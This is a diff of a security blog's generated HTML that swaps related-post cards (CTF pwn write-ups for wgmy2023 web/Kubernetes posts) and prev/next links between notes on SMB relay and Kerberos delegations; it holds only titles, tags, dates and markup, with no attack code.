         <div class="py-1 prose dark:prose-invert">
-          Double free into tcache poisoning
+          Personal notes on SMB relay attack
         </div>
         
       </div>
@@ -1325,7 +1521,7 @@ only relay from anywhere (<code>dc01</code>, <code>ws01</code>) to <code>ws02</c
   
   
 
-  <a href="/posts/cakectf-2023/pwn/memorial-cabbage/" class="min-w-full">
+  <a href="/posts/wgmy2023/web/secret/" class="min-w-full">
     
     <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative backdrop-blur">
 
@@ -1333,7 +1529,7 @@ only relay from anywhere (<code>dc01</code>, <code>ws01</code>) to <code>ws02</c
 
         
         <div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
-          href="/posts/cakectf-2023/pwn/memorial-cabbage/">Memorial Cabbage</div>
+          href="/posts/wgmy2023/web/secret/">Secret</div>
         
 
         <div class="text-sm text-neutral-500 dark:text-neutral-400">
@@ -1367,10 +1563,12 @@ only relay from anywhere (<code>dc01</code>, <code>ws01</code>) to <code>ws02</c
 
 
 
+
+
 <div style="cursor: default;" class="flex flex-row flex-wrap items-center">
   
   
-  <time datetime="2023-11-16 00:00:00 &#43;0000 UTC">16 November 2023</time>
+  <time datetime="2023-12-17 10:29:56 &#43;0800 &#43;08">17 December 2023</time><span class="px-2 text-primary-500">&middot;</span><time datetime="2023-12-22 10:43:26 &#43;0800 &#43;08">Updated: 22 December 2023</time>
   
 
   
@@ -1388,23 +1586,34 @@ only relay from anywhere (<code>dc01</code>, <code>ws01</code>) to <code>ws02</c
   
   
   
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/categories/cakectf-2023/&#34;,'_self');">
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/categories/wgmy2023/&#34;,'_self');">
     <span class="flex">
   <span
     class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
   >
-    CakeCTF 2023
+    wgmy2023
   </span>
 </span>
 
   </span>
   
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/categories/pwn/&#34;,'_self');">
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/categories/web/&#34;,'_self');">
     <span class="flex">
   <span
     class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
   >
-    pwn
+    web
+  </span>
+</span>
+
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/categories/k8s/&#34;,'_self');">
+    <span class="flex">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
+  >
+    k8s
   </span>
 </span>
 
@@ -1415,6 +1624,19 @@ only relay from anywhere (<code>dc01</code>, <code>ws01</code>) to <code>ws02</c
   
   
   
+  
+  
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/hashicorp-vault/&#34;,'_self');">
+    <span class="flex">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
+  >
+    hashicorp vault
+  </span>
+</span>
+
+  </span>
   
   
   
@@ -1427,7 +1649,7 @@ only relay from anywhere (<code>dc01</code>, <code>ws01</code>) to <code>ws02</c
 
         
         <div class="py-1 prose dark:prose-invert">
-          Overwriting <code>mkdtemp</code> return path
+          Read secret from HashiCorp vault
         </div>
         
       </div>
@@ -1439,7 +1661,7 @@ only relay from anywhere (<code>dc01</code>, <code>ws01</code>) to <code>ws02</c
   
   
 
-  <a href="/posts/cakectf-2023/pwn/bofww/" class="min-w-full">
+  <a href="/posts/wgmy2023/web/status/" class="min-w-full">
     
     <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative backdrop-blur">
 
@@ -1447,7 +1669,7 @@ only relay from anywhere (<code>dc01</code>, <code>ws01</code>) to <code>ws02</c
 
         
         <div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
-          href="/posts/cakectf-2023/pwn/bofww/">bofww</div>
+          href="/posts/wgmy2023/web/status/">Status</div>
         
 
         <div class="text-sm text-neutral-500 dark:text-neutral-400">
@@ -1484,7 +1706,7 @@ only relay from anywhere (<code>dc01</code>, <code>ws01</code>) to <code>ws02</c
 <div style="cursor: default;" class="flex flex-row flex-wrap items-center">
   
   
-  <time datetime="2023-11-16 00:00:00 &#43;0000 UTC">16 November 2023</time>
+  <time datetime="2023-12-17 09:38:00 &#43;0800 &#43;08">17 December 2023</time>
   
 
   
@@ -1502,23 +1724,34 @@ only relay from anywhere (<code>dc01</code>, <code>ws01</code>) to <code>ws02</c
   
   
   
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/categories/cakectf-2023/&#34;,'_self');">
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/categories/wgmy2023/&#34;,'_self');">
     <span class="flex">
   <span
     class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
   >
-    CakeCTF 2023
+    wgmy2023
   </span>
 </span>
 
   </span>
   
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/categories/pwn/&#34;,'_self');">
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/categories/web/&#34;,'_self');">
     <span class="flex">
   <span
     class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
   >
-    pwn
+    web
+  </span>
+</span>
+
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/categories/k8s/&#34;,'_self');">
+    <span class="flex">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
+  >
+    k8s
   </span>
 </span>
 
@@ -1532,23 +1765,23 @@ only relay from anywhere (<code>dc01</code>, <code>ws01</code>) to <code>ws02</c
   
   
   
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/bof/&#34;,'_self');">
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/nginx/&#34;,'_self');">
     <span class="flex">
   <span
     class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
   >
-    bof
+    nginx
   </span>
 </span>
 
   </span>
   
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/cpp/&#34;,'_self');">
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/off-by-slash/&#34;,'_self');">
     <span class="flex">
   <span
     class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400"
   >
-    cpp
+    off-by-slash
   </span>
 </span>
 
@@ -1565,7 +1798,7 @@ only relay from anywhere (<code>dc01</code>, <code>ws01</code>) to <code>ws02</c
 
         
         <div class="py-1 prose dark:prose-invert">
-          Buffer overflow into arbitrary address write via std::string <code>=</code> operator
+          Retrieve nginx config file from k8s configmaps
         </div>
         
       </div>
@@ -1581,8 +1814,8 @@ only relay from anywhere (<code>dc01</code>, <code>ws01</code>) to <code>ws02</c
       </div>
      
      <script>
-        var oid = "views_notes\/active-directory\/smb-relay-attack\/index.md"
-        var oid_likes = "likes_notes\/active-directory\/smb-relay-attack\/index.md"
+        var oid = "views_notes\/active-directory\/delegations\/index.md"
+        var oid_likes = "likes_notes\/active-directory\/delegations\/index.md"
       </script>
       
       
@@ -1601,30 +1834,30 @@ only relay from anywhere (<code>dc01</code>, <code>ws01</code>) to <code>ws02</c
       <div class="flex justify-between pt-3">
         <span>
           
-        </span>
-        <span>
-          
-            <a class="flex text-right group ml-3" href="/notes/active-directory/delegations/">
+            <a class="flex group mr-3" href="/notes/active-directory/smb-relay-attack/">
+              <span
+                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+              <span
+                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
               <span class="flex flex-col">
                 <span
                   class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
-                  >Kerberos Delegations</span
+                  >SMB Relay Attack</span
                 >
                 <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                   
-                    <time datetime="2024-01-18 15:01:22 &#43;0800 &#43;08">18 January 2024</time>
+                    <time datetime="2023-12-15 16:55:58 &#43;0800 &#43;08">15 December 2023</time>
                   
                 </span>
               </span>
-              <span
-                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
-                >&rarr;</span
-              >
-              <span
-                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
-                >&larr;</span
-              >
             </a>
+          
+        </span>
+        <span>
           
         </span>
       </div>
